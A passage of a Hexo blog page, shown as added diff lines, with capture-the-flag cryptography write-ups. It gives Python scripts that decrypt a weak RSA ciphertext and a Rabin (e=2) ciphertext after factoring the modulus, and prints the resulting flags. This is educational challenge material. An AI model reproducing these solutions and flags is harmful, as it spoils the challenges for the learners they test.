class="number">3161262255255421133292506694323988711204792818702640666084331634444148712428915950639954540974469931426618702044672318134908678730641981414037034058320359158246813987154679178159391832232990193738454116371045928434239936027006539348488316754611586659587677659791620481200732564068367148541242426533823626586574915275209508300120574819113851895932912208783915652764568319771482309338434364094681579135086703127977870534715039005822312878739611630155714313119545610939253355808742646891815442758660278514976431521933763272615653261044607041876212998883732724662410197038419721773290601109065965674129599626151139566369</span></span><br><span class="line">p = <span class="number">56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848447</span></span><br><span class="line">q = <span class="number">56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848927</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">631583911592660652215412683088688785438938386403323323131247534561958531288570612134139288090533619548876156447498627938626419617968918299212863936839701943643735437264304062828205809984533592547599060829451668240569384130130080928292082888526567902695707215660020201392640388518379063244487204881439591813398495285025704285781072987024698133147354238702861803146548057736756003294248791827782280722670457157385205787259979804892966529536902959813675537028879407802365439024711942091123058305460856676910458268097798532901040050506906141547909766093323197363034959926900440420805768716029052885452560625308314284406</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yafu_is_great_2&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="hardRSA"><a href="#hardRSA" class="headerlink" title="hardRSA"></a>hardRSA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -in pubkey.pem -text -modulus</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n&#x3D;C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">n&#x3D;87924348264132406875276140514499937145050893665602592992418171647042491658461</span><br><span class="line">e&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>e=2，rabin算法</p>
+<p><img src="/image/jarvisoj/1-1605447043321.png" alt="1"></p>
+<p>在线分解出p，q</p>
+<p>p=275127860351348928173285174381581152299</p>
+<p>q= 319576316814478949870590164193048041239</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取公钥参数</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher = string.atoi(cipher, base=<span class="number">16</span>)</span><br><span class="line">    <span class="comment"># print cipher</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"please input p"</span></span><br><span class="line">p = int(raw_input(), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'please input q'</span></span><br><span class="line">q = int(raw_input(), <span class="number">10</span>)</span><br><span class="line"><span class="comment"># 计算yp和yq</span></span><br><span class="line">inv_p = gmpy2.invert(p, q)</span><br><span class="line">inv_q = gmpy2.invert(q, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算mp和mq</span></span><br><span class="line">mp = pow(cipher, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">mq = pow(cipher, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算a,b,c,d</span></span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % N</span><br><span class="line">b = N - int(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % N</span><br><span class="line">d = N - int(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (a, b, c, d):</span><br><span class="line">    s = <span class="string">'%x'</span> % i</span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        s = <span class="string">'0'</span> + s</span><br><span class="line">    <span class="keyword">print</span> s.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCTF&#123;sp3ci4l_rsa&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/10/23/heap-learn/" rel="next" title="heap_learn">
+                <i class="fa fa-chevron-left"></i> heap_learn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.jpg"
+                alt="caiii-vegtable" />
+            
+              <p class="site-author-name" itemprop="name">caiii-vegtable</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-text">level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-text">level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2-x64"><span class="nav-text">level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3-x64"><span class="nav-text">level3_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-text">level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-text">level5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level6-x64"><span class="nav-text">level6_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fm"><span class="nav-text">fm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#itemboard"><span class="nav-text">itemboard</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xman2109-xcaesar"><span class="nav-text">[xman2109]xcaesar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-RAS"><span class="nav-text">Medium RAS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xman2019-xyf"><span class="nav-text">[xman2019]xyf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hardRSA"><span class="nav-text">hardRSA</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caiii-vegtable</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
